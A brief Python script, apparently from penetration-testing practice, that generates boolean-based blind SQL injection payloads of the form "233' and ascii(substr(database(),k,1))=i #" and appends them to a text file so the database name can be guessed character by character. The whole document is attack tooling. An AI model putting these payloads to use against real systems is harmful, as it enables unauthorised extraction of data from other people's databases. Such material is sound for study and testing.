for k in range(9):
    for i in range(97,123):
        a = "233' and ascii(substr(database()," + str(k) + ",1))=" + str(i) + " #\n"
        fp = open('shentou4.txt', 'a+')
        fp.write(a)

